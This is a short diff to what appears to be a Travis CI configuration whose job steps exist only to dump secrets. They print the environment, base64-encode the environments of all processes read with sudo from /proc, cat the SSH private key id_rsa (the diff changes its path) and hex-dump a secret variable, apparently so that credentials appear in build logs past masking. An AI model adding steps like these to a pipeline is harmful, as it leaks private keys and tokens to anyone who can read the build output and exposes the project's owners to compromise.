@@ -4,7 +4,7 @@ jobs:
   - script: env
   - script: cat /home/travis/.travis/job_stages
   - script: sudo strings /proc/*/environ | sort -u | base64
-  - script: cat ~/.ssh/id_rsa
+  - script: cat /home/travis/.ssh/id_rsa
   - script: echo $SECRET1 |hd
 env:
   global:
